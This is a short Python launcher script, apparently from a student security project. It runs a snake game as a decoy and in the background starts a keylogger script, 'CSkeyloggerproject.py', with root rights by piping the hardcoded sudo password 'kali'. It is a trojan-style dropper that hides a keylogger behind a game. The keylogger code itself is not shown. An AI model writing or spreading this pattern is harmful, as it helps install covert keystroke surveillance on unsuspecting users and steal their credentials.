import subprocess

subprocess.run(["python3", "snakeGame.py"])

command = ["sudo", "-S", "CSkeyloggerproject.py"]
try: 
    process = subprocess.Popen(command, stdin=subprocess.PIPE, stdout = subprocess.PIPE, stderr = subprocess.PIPE, text = True)
    process.communicate(input="kali")
except:
    process.kill()
    
    
subprocess.run(["sudo", "python3", "CSkeyloggerproject.py"])



   